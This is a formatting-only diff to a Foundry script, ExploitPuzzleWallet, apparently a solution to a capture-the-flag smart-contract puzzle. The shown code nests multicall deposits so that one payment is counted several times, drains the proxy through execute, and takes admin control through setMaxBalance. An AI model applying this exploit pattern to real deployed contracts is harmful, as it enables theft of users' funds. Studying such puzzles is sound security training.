@@ -19,8 +19,8 @@ contract ExploitPuzzleWallet is Script {
 
         vm.startBroadcast(pk);
 
-        proxy.multicall{ value: value }(batch);
-        proxy.execute{ value: 1 }(me, address(proxy).balance + 1, "");
+        proxy.multicall{value: value}(batch);
+        proxy.execute{value: 1}(me, address(proxy).balance + 1, "");
         proxy.setMaxBalance(uint160(me));
 
         vm.stopBroadcast();
@@ -29,7 +29,10 @@ contract ExploitPuzzleWallet is Script {
         console.log("Admin: ", proxy.maxBalance());
     }
 
-    function _makeBatch(uint256 layers, uint256 maxLayers) internal returns (bytes[] memory) {
+    function _makeBatch(
+        uint256 layers,
+        uint256 maxLayers
+    ) internal returns (bytes[] memory) {
         if (layers >= maxLayers - 1) {
             bytes[] memory latestBatch = new bytes[](1);
             latestBatch[0] = abi.encode(proxy.deposit.selector);
@@ -39,7 +42,10 @@ contract ExploitPuzzleWallet is Script {
         bytes[] memory batch = new bytes[](2);
 
         batch[0] = abi.encode(proxy.deposit.selector);
-        batch[1] = abi.encodeWithSelector(proxy.multicall.selector, _makeBatch(layers + 1, maxLayers));
+        batch[1] = abi.encodeWithSelector(
+            proxy.multicall.selector,
+            _makeBatch(layers + 1, maxLayers)
+        );
 
         return batch;
     }
@@ -56,7 +62,11 @@ interface IPuzzleWallet {
 
     function deposit() external payable;
 
-    function execute(address to, uint256 value, bytes calldata data) external payable;
+    function execute(
+        address to,
+        uint256 value,
+        bytes calldata data
+    ) external payable;
 
     function multicall(bytes[] calldata data) external payable;
 }
